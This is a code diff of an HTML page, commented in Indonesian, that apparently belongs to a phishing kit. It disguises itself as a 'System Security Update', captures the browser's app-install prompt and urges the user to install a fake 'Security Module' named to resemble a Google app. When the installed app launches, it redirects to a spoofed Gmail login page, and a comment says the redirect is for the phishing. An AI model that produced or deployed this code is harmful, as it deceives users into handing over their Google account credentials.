@@ -1,51 +1,73 @@
 <!doctype html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="manifest" href="manifest.json">
-    <style>
-        body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 10vh; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 1.2em; border-radius: 12px; font-weight: bold; cursor: pointer; width: 90%; display: none; }
-    </style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="manifest" href="manifest.json">
+<style>
+  body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 50px; }
+  .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); width: 85%; display: none; margin-top: 20px;}
+  #status { color: #9aa0a6; margin-bottom: 10px; font-size: 14px;}
+  #debug-log { font-size: 12px; color: #34a853; margin-top: 20px; text-align: left; padding: 10px; }
+</style>
 </head>
 <body>
-    <h2 id="txt">System Verification</h2>
-    <button class="btn" id="go">INSTALL SECURITY UPDATE</button>
+  <h2>System Security Update</h2>
+  <p id="status">Waiting for system handshake...</p>
+  
+  <button class="btn" id="installBtn">1. Activate Security Module</button>
+
+  <div id="debug-log">Status: Initializing...</div>
 
 <script>
-let p;
-// Register SW biar syarat PWA terpenuhi
-navigator.serviceWorker.register('sw.js');
+const log = (msg) => {
+    document.getElementById('debug-log').innerHTML += "<br>> " + msg;
+};
+
+// Cek standalone mode (buat phishing-nya)
+if (window.matchMedia('(display-mode: standalone)').matches) {
+    log("Standalone mode detected. Redirecting...");
+    window.location.href = "login-gmail-spoof.html";
+}
+
+let deferredPrompt;
+const installBtn = document.getElementById('installBtn');
+const statusText = document.getElementById('status');
+
+log("Looking for manifest...");
 
 window.addEventListener('beforeinstallprompt', (e) => {
+    log("Event captured! Device compatible.");
     e.preventDefault();
-    p = e;
-    document.getElementById('go').style.display = 'block';
-    document.getElementById('txt').innerText = "Device Compatible";
+    deferredPrompt = e;
+    
+    installBtn.style.display = 'block';
+    statusText.innerText = "Compatibility confirmed.";
 });
 
-document.getElementById('go').onclick = () => {
-    // 1. Buka jendela about:blank
-    let w = window.open('about:blank');
-    
-    // 2. Suntik tombol eksekusi ke about:blank
-    w.document.body.innerHTML = `
-        <body style="background:#202124;color:white;text-align:center;padding-top:40vh;font-family:sans-serif;">
-            <button style="background:#34a853;color:white;border:none;padding:25px;font-size:20px;border-radius:10px;width:90%;font-weight:bold;">
-                CONFIRM INSTALLATION
-            </button>
-        </body>`;
-
-    // 3. Trigger Prompt saat user klik tombol di about:blank
-    w.onclick = async () => {
-        if (p) {
-            p.prompt();
-            const { outcome } = await p.userChoice;
-            if (outcome === 'accepted') w.close();
-            p = null;
+installBtn.addEventListener('click', async () => {
+    if (deferredPrompt) {
+        log("Triggering prompt...");
+        deferredPrompt.prompt();
+        const { outcome } = await deferredPrompt.userChoice;
+        if (outcome === 'accepted') {
+            log("User accepted installation.");
+            alert("Security Module Installed. Open 'googlelogoligature' from Home Screen.");
         }
-    };
-};
+        deferredPrompt = null;
+    }
+});
+
+// Trick: Paksa user interaksi biar Chrome nembak event
+window.addEventListener('scroll', () => {
+    log("User interaction detected...");
+}, {once: true});
+
+// Tambahan buat mastiin service worker jalan (opsional tapi ngebantu PWA)
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('sw.js').then(() => {
+        log("Service Worker Active.");
+    });
+}
 </script>
 </body>
 </html>
